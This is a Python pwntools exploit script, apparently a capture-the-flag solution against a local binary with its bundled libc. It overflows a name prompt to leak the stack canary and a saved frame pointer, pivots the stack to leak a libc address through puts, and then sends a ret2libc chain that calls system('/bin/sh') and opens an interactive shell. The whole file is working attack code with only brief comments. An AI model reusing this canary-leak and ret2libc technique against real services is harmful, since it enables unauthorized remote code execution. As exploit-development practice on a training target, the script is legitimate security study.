```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./exe")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        #gdb.attach(r, gdbscript='b *0x004011cd')
    else:
        r = remote("remote", 10307)

    return r


def main():

    pop_rdi = 0x00000000004012fb

    r = conn()

    #Canary leak
    r.sendlineafter(b'What is your name?',b'A' * 55)
    r.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n')
    canary = b'\x00' + r.recv(7)#raw bytes to int
    canary = u64(canary)

    #Buffer leak
    rbp = r.recv(6)
    rbp = int.from_bytes(rbp, byteorder='little')
    buffer = rbp - 0x60

    #Check
    r.recv(4096)
    print('Buffer: ' , hex(buffer))
    print('Canary: ', hex(canary))
    print('RBP :', hex(rbp))

    #Stack Pivoting
    chain = flat(0, pop_rdi , exe.got.puts , exe.plt.puts, exe.sym.main)#return to main
    payload = chain.ljust(56,b'A') + p64(canary) + p64(buffer)
    r.send(payload)
    r.recvuntil(b'Goodbye!\n')

    #leak
    leak = r.recv(6)
    libc.address = int.from_bytes(leak, byteorder = 'little') - libc.sym.puts

    #gadget
    pop_rax = 0x0000000000045eb0 + libc.address
    pop_rsi = 0x000000000002be51 + libc.address
    pop_rdx_r15 = 0x000000000011f497 + libc.address
    syscall = 0x0000000000029db4 + libc.address
    sh = next(libc.search(b"/bin/sh\x00"))
    print("libc: ", hex(libc.address))

    #Ret2libc
    ret = 0x0000000000401016
    buffer = rbp - 0xa0
    print('Buffer: ',hex(buffer))
    r.send(b'A' * 56)
    chain = flat(0, pop_rdi , sh , ret, libc.sym.system)
    payload = chain.ljust(56,b'A') + p64(canary) + p64(buffer)
    #r.recvuntil(b"Where are you from?")
    r.send(payload)

    r.interactive()
if __name__ == "__main__":
    main()
```
